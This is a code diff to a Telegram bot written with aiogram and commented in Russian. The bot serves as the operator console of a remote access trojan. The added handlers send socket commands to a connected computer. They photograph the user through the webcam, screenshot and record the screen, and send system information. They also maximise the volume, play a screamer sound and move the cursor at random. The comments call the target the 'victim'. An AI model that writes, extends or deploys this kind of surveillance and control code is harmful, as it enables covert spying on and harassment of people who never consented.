@@ -1,4 +1,4 @@
-from keyboard.list_keyboards_info import connected_keyboard, keyboard_control_pc, keyboard_check_is_control, keyboard_control_youtube
+from keyboard.list_keyboards_info import connected_keyboard, keyboard_control_pc, keyboard_check_is_control, keyboard_control_youtube, screen_recording_keyboard, random_cursor_keyboard
 from keyboard.kbBuilder import make_row_inline_keyboards
 from aiogram.types import Message, CallbackQuery
 from aiogram.fsm.context import FSMContext
@@ -150,7 +150,7 @@ async def look_screen_func(callback: CallbackQuery):
     """
     Данная функция отправляет сообщение на компьютер к которому мы подключились с помощью сокетов.
      Функция называется look_screen (Блокировка экрана (Выключение экрана)).
-      На стороне клиента эта функция уже обрабатывает функцию для выключения экрана до первого взаимодействия пользователя с компьютером. После чего экран сново включиться.
+      На стороне клиента эта функция уже обрабатывает функцию для выключения экрана до первого взаимодействия пользователя с компьютером. После чего экран снова включиться.
       Тем самым мы можем удаленно выключать экран любого компьютера.
     """
 
@@ -214,10 +214,10 @@ async def blue_screen(callback: CallbackQuery):
 
 
 # Функция скриншота камеры пользователя и отправки фотографии в телеграмм
-@router.callback_query(F.data == 'screenshot_user')
-async def screenshot_user_func(callback: CallbackQuery):
+@router.callback_query(F.data == 'screenshot_user_data')
+async def image_user_func(callback: CallbackQuery):
     """
-    Данная функция делает скриншот пользователя если у пользователя есть камера
+    Данная функция делает фотографию пользователя если у пользователя есть камера
     В случае если есть, программа делает фотку и отправляет вам фотку в личные сообщения.
     """
 
@@ -226,7 +226,175 @@ async def screenshot_user_func(callback: CallbackQuery):
 
     if client:
         try:
-            client.send('screenshot_user'.encode())
+            client.send('screenshot_user_data'.encode())
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+# Данная функция делает скриншот рабочего стола пользователя
+@router.callback_query(F.data == 'screenshot_screen_data')
+async def screenshot_main_window_func(callback: CallbackQuery):
+    """
+    Данная функция делает скриншот рабочего стола пользователя и отправляет вам в личные сообщения
+    """
+
+    await callback.answer('')
+    global client
+
+    if client:
+        try:
+            client.send("screenshot_screen_data".encode())
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+# Создает клавиатуры в которой выбираете то что будете делать с экраном жертвы
+@router.callback_query(F.data == 'recording_screen_data')
+async def record_screen_data(callback: CallbackQuery):
+    """
+    Создает клавиатуры в которой выбираете то что будете делать с экраном жертвы
+    """
+    # К имеющейся клавиатуре добавляет новую кнопку "Назад"
+    add_back_data_keyboard = [("Назад", "back_data")] + screen_recording_keyboard
+    await callback.answer("")
+    await callback.message.answer("Выберите опцию: ", reply_markup=make_row_inline_keyboards(add_back_data_keyboard))
+
+
+@router.callback_query(F.data == 'start_record_data')
+async def start_record_func(callback: CallbackQuery):
+    global client
+    if client:
+        try:
+            client.send('start_record_data'.encode())
+            await callback.message.answer('Чтобы остановить запись достаточно нажать на кнопку "Остановить запись"', reply_markup=make_row_inline_keyboards(screen_recording_keyboard))
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+@router.callback_query(F.data == 'stop_record_data')
+async def stop_record_func(callback: CallbackQuery):
+    await callback.answer()
+    global client
+
+    if client:
+        try:
+            client.send('stop_record_data'.encode())
+            await callback.message.answer("Запись успешно сохранена! Ожидайте, запись экрана грузится.")
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+# Скрывает все окна
+@router.callback_query(F.data == 'hide_all_windows_data')
+async def hide_all_windows_data_func(callback: CallbackQuery):
+    """
+    """
+
+    await callback.answer()
+
+    global client
+    if client:
+        try:
+            client.send("hide_all_windows_data".encode())
+            await callback.message.answer('Все окна успешно свернуты!')
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+# Устанавливает максимальный звук на компьютере
+@router.callback_query(F.data == 'max_volume_data')
+async def max_volume_data_func(callback: CallbackQuery):
+    """
+    """
+
+    await callback.answer()
+    global client
+
+    if client:
+        try:
+            client.send('max_volume_data'.encode())
+            await callback.message.answer("Максимальная громкость компьютера включена.")
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+# Устанавливает максимальный звук на компьютере и включает резкий звук
+@router.callback_query(F.data == 'screamer_song_data')
+async def screamer_song_data_func(callback: CallbackQuery):
+    """
+    """
+    await callback.answer()
+    global client
+
+    if client:
+        try:
+            client.send('screamer_song_data'.encode())
+            await callback.message.answer("Максимальная громкость компьютера включена.")
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+# Создаем клавиатуру с Вкл/Выкл'ем случайного перемещения курсора
+@router.callback_query(F.data == 'control_mouse_data')
+async def control_mouse_data(callback: CallbackQuery):
+    """"""
+    # К имеющейся клавиатуре добавляю кнопку "Назад"
+    keyboard = [("Назад", "back_data")] + random_cursor_keyboard
+    await callback.message.answer('Какое действие вы хотите совершить с мышкой?', reply_markup=make_row_inline_keyboards(keyboard))
+
+
+@router.callback_query(F.data == 'random_cursor_start_data')
+async def random_cursor_start_data_func(callback: CallbackQuery):
+    global client
+
+    if client:
+        try:
+            client.send('random_cursor_start_data'.encode())
+            await callback.message.answer('Случайное перемещение курсора - Начато! Чтобы остановить перемещение, нажмите "Остановить перемещение"', reply_markup=random_cursor_keyboard)
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+@router.callback_query(F.data == 'random_cursor_stop_data')
+async def random_cursor_stop_data_func(callback: CallbackQuery):
+    global client
+
+    if client:
+        try:
+            client.send('random_cursor_stop_data'.encode())
+            await callback.message.answer('Вы успешно выключили перемещение курсора!')
+
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+@router.callback_query(F.data == 'system_info_data')
+async def system_info_data_func(callback: CallbackQuery):
+    global client
+
+    if client:
+        try:
+            client.send('system_info_data'.encode())
+            await callback.message.answer('Данные компьютера успешно переданы!')
+
         except Exception as e:
             await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
     else:
